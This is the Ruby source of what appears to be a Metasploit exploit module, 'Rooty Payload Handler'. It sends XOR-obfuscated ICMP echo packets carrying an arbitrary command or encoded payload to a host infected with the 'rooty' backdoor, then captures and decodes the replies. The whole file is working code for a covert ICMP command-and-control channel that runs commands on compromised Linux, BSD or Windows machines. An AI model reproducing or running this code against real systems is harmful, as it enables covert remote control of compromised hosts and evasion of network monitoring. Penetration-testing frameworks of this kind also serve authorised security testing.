##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 <  Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Capture

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Rooty Payload Handler',
      'Description'    => %q{
        This module will send a ICMP "encrypted" packet with a payload or command to execute to a host running rooty.
      },
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'EXITFUNC' => 'thread', },
      'Author'         =>  ['hal'],
      'References'     =>  [ ],
      'Payload'        =>
        {
          'Space'       => 1500,
          'BadChars'    => '',
          'DisableNops' => true,
        },
      'Platform'       => %w{ linux bsd win },
      'Arch'           => ARCH_ALL,
      'Targets'        => [ [ 'Universal', { } ] ],
      'DefaultTarget'  => 0
      ))

      deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT')
      register_options(
      [
        OptString.new('SHOST',   [false, 'The source address of the ICMP packet', nil]),
        OptString.new('CMD',     [false, 'The command to execute on the host', nil]),
        OptInt.new('TIMEOUT',     [false, 'How long to wait for responses.', 2]),
      ], self.class)
  end

  def exploit
    check_pcaprub_loaded

    open_pcap
    pcap = self.capture
    capture_sendto(build_icmp(), datastore['RHOST'])
    print_status("Packet sent.")

    data = ""
    begin
      Timeout.timeout(datastore['TIMEOUT']) do
        each_packet do |pkt|
          p = PacketFu::Packet.parse(pkt)
          next unless p.is_icmp?
    
          key = (p.icmp_sum & 0xff) ^ ((p.icmp_sum >> 8) & 0xff)
          decoded = p.payload.each_byte.map {|c| (c^key).chr }.join

          if decoded[4..10] == "GOATSE\x02"
            data << decoded[11..-1]
          end
        end
      end
    rescue Timeout::Error
      # Ignore 
    end

    if data.size > 0
      print_good "Response received:\n#{data}"  
    else
      print_error "No response received."
    end
    close_pcap
  end


  def build_icmp()
    chksum = rand(65535) + 1
    
    if datastore['CMD'].nil? || datastore['CMD'] == ''
      if datastore['PAYLOAD'].nil? || datastore['PAYLOAD'] == ''
        fail_with(Failure::BadConfig, "CMD was not specified and no PAYLOAD was set")
      else
        data = "GOATSE\x01" + payload.encoded
      end
    else
      data = "GOATSE\x02" + datastore['CMD'] + "\x00"
    end

    key = (chksum & 0xff) ^ ((chksum >> 8) & 0xff)
       
    p = PacketFu::ICMPPacket.new
    p.icmp_type = 8
    p.icmp_code = 0
    p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
    p.ip_daddr = datastore['RHOST']
    p.payload = capture_icmp_echo_pack(rand(65535) + 1, rand(65535) + 1, data.each_byte.map {|c| (c^key).chr }.join)
    p.recalc
    p.icmp_sum = chksum & 0xffff
    return p
  end
end
